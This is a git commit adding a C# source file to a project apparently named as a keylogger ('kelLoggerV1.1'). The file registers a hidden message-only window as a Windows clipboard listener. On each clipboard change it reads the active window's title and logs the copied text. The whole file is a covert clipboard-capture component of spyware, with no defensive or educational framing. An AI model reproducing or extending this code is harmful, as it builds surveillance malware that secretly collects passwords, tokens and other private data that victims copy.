1ed23624020d09ccde79fa0d4893cd124c97b694
Il0naB0guslav <i_boguslav03@mail.ru>
2021-10-08 13:51:03 +0300

    Добавьте файлы проекта.

---
+++ kelLoggerV1.1/dllUse.cs
@@ -0,0 +1,80 @@
+﻿using System;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Diagnostics;
+
+namespace kelLoggerV1
+{
+
+    internal static class NativeMethods
+    {
+        public const int WM_CLIPBOARDUPDATE = 0x031D;
+        public static IntPtr HWND_MESSAGE = new IntPtr(-3);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+
+        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
+        [DllImport("user32.dll")]
+        public static extern int GetWindowTextLength(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+    }
+
+    public static class Clipboard
+    {
+        public static string GetText()
+        {
+            string ReturnValue = string.Empty;
+            Thread STAThread = new Thread(
+                delegate ()
+                {
+                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
+                });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+
+            return ReturnValue;
+        }
+    }
+
+    public sealed class ClipboardNotification
+    {
+        public class NotificationForm : Form
+        {
+            string lastWindow = "";
+
+            public NotificationForm()
+            {
+                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
+                NativeMethods.AddClipboardFormatListener(Handle);
+            }
+
+            protected override void WndProc(ref Message m)
+            {
+                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
+                {
+
+                    IntPtr active_window = NativeMethods.GetForegroundWindow();
+                    int length = NativeMethods.GetWindowTextLength(active_window);
+                    StringBuilder sb = new StringBuilder(length + 1);
+                    NativeMethods.GetWindowText(active_window, sb, sb.Capacity);
+                    Trace.WriteLine("");
+                    Trace.WriteLine("\t[cntrl-C] Clipboard Copied: " + Clipboard.GetText());
+                }
+                base.WndProc(ref m);
+            }
+        }
+
+    }
+}
